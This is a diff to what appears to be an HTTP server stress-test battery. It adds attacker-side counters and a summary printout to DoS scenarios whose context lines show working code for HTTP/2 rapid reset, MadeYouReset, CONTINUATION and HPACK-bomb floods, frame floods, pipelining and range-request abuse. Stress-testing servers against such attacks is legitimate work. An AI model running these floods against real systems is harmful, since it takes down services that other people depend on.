@@ -13,6 +13,7 @@ literals only).
 import asyncio, os, random, re, socket, struct, subprocess, sys, threading, time
 
 PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
+COUNT = {"conns": 0, "reqs": 0, "resps": 0, "errs": 0, "bytes_sent": 0}  # attacker-side counters, printed at exit
 
 
 def frame(typ, flags, sid, payload=b""):
@@ -74,6 +75,7 @@ async def connect(host, port, rcvbuf=None):
         s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, rcvbuf)
     loop = asyncio.get_running_loop()
     await loop.sock_connect(s, (host, port))
+    COUNT["conns"] += 1
     return s
 
 
@@ -95,6 +97,7 @@ async def run_workers(n, dl, fn, *a):
             try:
                 await fn(i, dl, *a)
             except (OSError, asyncio.TimeoutError):
+                COUNT["errs"] += 1
                 await asyncio.sleep(0.05)
     await asyncio.gather(*[w(i) for i in range(n)])
 
@@ -144,6 +147,7 @@ async def nonreader(i, dl, host, port, path=b"/?s=1g"):
 def h2_conn(host, port, init_settings=()):
     s = socket.create_connection((host, port))
     s.sendall(PREFACE + settings(init_settings))
+    COUNT["conns"] += 1
     return s
 
 
@@ -163,6 +167,7 @@ def h2_rapid_reset_t(i, dl, host, port):
                                for k in range(200))
                 sid += 400
                 s.sendall(buf)
+                COUNT["reqs"] += 200; COUNT["bytes_sent"] += len(buf)
                 try:
                     while s.recv(65536, socket.MSG_DONTWAIT):
                         pass
@@ -181,6 +186,7 @@ def h2_flood_t(i, dl, host, port):
             s = h2_conn(host, port)
             while not dl.over():
                 s.sendall(batch)
+                COUNT["bytes_sent"] += len(batch)
                 if reads:
                     try:
                         while s.recv(65536, socket.MSG_DONTWAIT):
@@ -331,6 +337,7 @@ async def read_h1_response(s, dl, timeout=10):
                 return None
             rest += d
     try:
+        COUNT["resps"] += 1
         return int(head[9:12])
     except ValueError:
         return None
@@ -350,6 +357,7 @@ async def hoic_rand(i, dl, host, port):
             else:
                 req = b"GET " + rand_path() + b" HTTP/1.1\r\nHost: battery\r\n" + rand_headers() + b"\r\n"
             await loop.sock_sendall(s, req)
+            COUNT["reqs"] += 1
             if await read_h1_response(s, dl) is None:
                 return
             n += 1
@@ -368,6 +376,7 @@ async def h1_pipeline(i, dl, host, port):
         batch = b"".join(h1_get(b"/?s=1k", b"User-Agent: pipeline\r\n") for _ in range(100))
         while not dl.over():
             await loop.sock_sendall(s, batch)
+            COUNT["reqs"] += 100
             for _ in range(100):
                 if await read_h1_response(s, dl) is None:
                     return
@@ -384,6 +393,7 @@ async def h1_range(i, dl, host, port):
         rng = b"Range: bytes=" + b",".join(b"%d-%d" % (k, k + 1000) for k in range(0, 2000, 2)) + b"\r\n"
         while not dl.over():
             await loop.sock_sendall(s, h1_get(b"/?s=1m", rng))
+            COUNT["reqs"] += 1
             if await read_h1_response(s, dl) is None:
                 return
             await asyncio.sleep(0.01)
@@ -421,6 +431,7 @@ async def h2_continuation(i, dl, host, port):
         csid = sid + 2 if i % 4 == 0 else sid
         while not dl.over():
             await loop.sock_sendall(s, frame(9, 0, csid, chunk))
+            COUNT["bytes_sent"] += len(chunk) + 9
             try_drain(s)
             await asyncio.sleep(0.001)
     finally:
@@ -467,6 +478,7 @@ async def h2_hpack_bomb(i, dl, host, port):
             else:
                 hb = b"\x82\x86\x84\x41" + hpack_lit(b"battery") + h2_hb_fields(64)
             await loop.sock_sendall(s, frame(1, 0x5, sid, hb))
+            COUNT["reqs"] += 1; COUNT["bytes_sent"] += len(hb) + 9
             sid += 2
             try_drain(s)
             await asyncio.sleep(0.005)
@@ -495,6 +507,7 @@ def h2_madeyoureset_t(i, dl, host, port):
                 buf = b"".join(h2_request(sid + 2 * k, b"/?s=1m") + trigger(sid + 2 * k, b) for k in range(200))
                 sid += 400; b += 1
                 s.sendall(buf)
+                COUNT["reqs"] += 200; COUNT["bytes_sent"] += len(buf)
                 try_drain(s)
                 time.sleep(0.005)
             s.close()
@@ -520,6 +533,7 @@ def h2_frame_flood_t(kind):
                     batch = (frame(8, 0, 1, struct.pack(">I", 1)) + frame(8, 0, 0, struct.pack(">I", 1))) * 500
                 while not dl.over():
                     s.sendall(batch)
+                    COUNT["bytes_sent"] += len(batch)
                     if reads:
                         try_drain(s)
                     time.sleep(0.002)
@@ -660,6 +674,8 @@ def attack(name, host, port, secs, n):
     elif name == "tls_reneg": thread_pool(n or 50, tls_reneg_t, dl, host, port)
     elif name == "maxconn_full": aio(maxconn_full, n or 2500)
     else: sys.exit("unknown scenario " + name)
+    import json
+    print("SUMMARY " + json.dumps(COUNT), flush=True)
 
 
 # ---- misbehaving backends --------------------------------------------------------------
